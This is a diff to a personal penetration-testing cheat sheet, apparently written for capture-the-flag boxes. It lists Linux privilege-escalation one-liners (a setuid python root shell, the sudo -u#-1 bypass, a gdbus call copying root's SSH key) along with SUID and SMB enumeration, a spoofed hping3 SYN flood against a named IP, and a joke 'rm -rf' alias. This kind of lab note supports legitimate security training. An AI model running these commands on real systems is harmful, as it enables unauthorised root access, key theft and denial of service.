@@ -3,38 +3,51 @@
 **Box Notes**
 1. Always check /etc/sudoers.d
 2. Always check /etc/crontab
-
-3. Always check capabilities >>> getcap -r / 2>/dev/null
+3. Always check version, kernel release, and stuff
+```
+cat /etc/*release
+uname -a 
+cat /etc/issue 
+```
+4. Always check capabilities >>> getcap -r / 2>/dev/null
 Keep an eye on cap_setuid+ep or setuid capabilities mostly.
 If there's thing like `/usr/bin/python3 = cap_setuid+ep`
 We can just exploit that like `/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")`
 
+5. find / -perm -u=s -type f 2>/dev/null >>> to find some suid misconf
+6. find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+7. find / -user root -perm -4000 -print 2>/dev/null
+8. find / -type f -perm -04000 -ls 2>/dev/null
 
-4. find / -perm -u=s -type f 2>/dev/null >>> to find some suid misconf
-5. find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-6. find / -user root -perm -4000 -print 2>/dev/null
-7. find / -type f -perm -04000 -ls 2>/dev/null
-8. when u got privesc thing just http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or just `chmod +s /bin/bash` as root, bash -p
-9. linpeas linenum pspy name ur shits
-10. Always check `cat ~/.*history | less` or just `history`
-11. Use ysoserial to exploit java deserialization to get revershell or RCE (payload have to be in a file). Then use it or encode it first, what ever.
-12. Remember CVE-2019-13287 (ALL, !root) /bin/bash >>> sudo -u#-1 /bin/bash
-13. `.conf` file may contain something. (usually in /etc/apache2)
-14. Stuck? Bruteforce with no end? Generate your own wordlist with cewl! Example: cewl http://10.10.10.191/ -w customwordlist.txt -m 6
-15. 
+9. IF there's motd.d executed once connected, always check the permission of the /etc/motd.d see if u can write on it
+
+10. when u got privesc thing just http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or just `chmod +s /bin/bash` as root, bash -p
+11. linpeas linenum pspy name ur shits
+12. Always check `cat ~/.*history | less` or just `history`
+13. Use ysoserial to exploit java deserialization to get revershell or RCE (payload have to be in a file). Then use it or encode it first, what ever.
+14. Remember CVE-2019-13287 (ALL, !root) /bin/bash >>> sudo -u#-1 /bin/bash
+15. `.conf` file may contain something. (usually in /etc/apache2)
+16. Stuck? Bruteforce with no end? Generate your own wordlist with cewl! Example: cewl http://10.10.10.191/ -w customwordlist.txt -m 6
+17. 
 - SMB enum >>> smbclient -L //[IP](its_the_same_like_--list=[IP]), and continue with the shares name  smbclient //[IP]/[sharename]
 - smbclient //[IP]/[sharename] --user=[username] --workgroup=[forest name] 
 - smbclient -N //[IP]/[sharename]
-16. rpcclient --user=[username] [target-ip] -W [forest name]
-17. Check cdata
-18. Port 11211 is memcached server >>> https://www.hackingarticles.in/penetration-testing-on-memcached-server/
-19. Always check `netstat -tulpn`
-20. Enum smtp with telnet.
+18. rpcclient --user=[username] [target-ip] -W [forest name]
+19. Check cdata
+20. Port 11211 is memcached server >>> https://www.hackingarticles.in/penetration-testing-on-memcached-server/
+21. Always check `netstat -tulpn`
+22. Enum smtp with telnet.
+23. On windows, always check `whoami /priv` and find recent vulnerability.
 
 
 **Gdbuss Root SSH Privesc**
 1. gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/root_rsa true
 https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
+
+
+**LOGS**
+1. Always check /var/log/auth.log
+2. Always check /var/log/apache2/access.log
 
 
 **Wild card privesc**
@@ -161,7 +174,6 @@ Ex: ip.src == [IP] && http
 
 
 **Crunch**
-
 ## Generate wordlists with Crunch
 Ex: 
 Default charset is lowecase alphabet
@@ -186,6 +198,7 @@ Charset (-f)
 
 **Random**
 1. hashcat --example-hash >> or just visit the one in the web
+<hash>:<salt>
 2. diff -y [file1] [file2] >> compare file side by side
 3. binary mode FTP is better
 4. watch -n 0 [stuff you want to watch]
@@ -205,8 +218,17 @@ msfconsole --resource /var/lib/veil/output/handlers/[yourbackdoor]
 	example: sudo hping3 -S 45.33.32.156 -p 80 -a 173.203.36.104 --flood --rand-source -V >>> -V for verbose
 10. alias cd='rm -rf' >> LOL DONT DO THIS
 11. ping and look at the TTL to find the target OS.
+12. 
+
 
 **OSINT**
 1. Twitter is your friend
 2. Wayback machine is a thing
 3. Just use frickin sherlock if you have a username >>> python3 sherlock/ `username`
+
+
+**Tricks**
+1. [command name]() { cd "$@" && ls; } >> Auto ls when cd
+ex:
+cdls(){ cd "$@" && ls; }
+i prefer just c
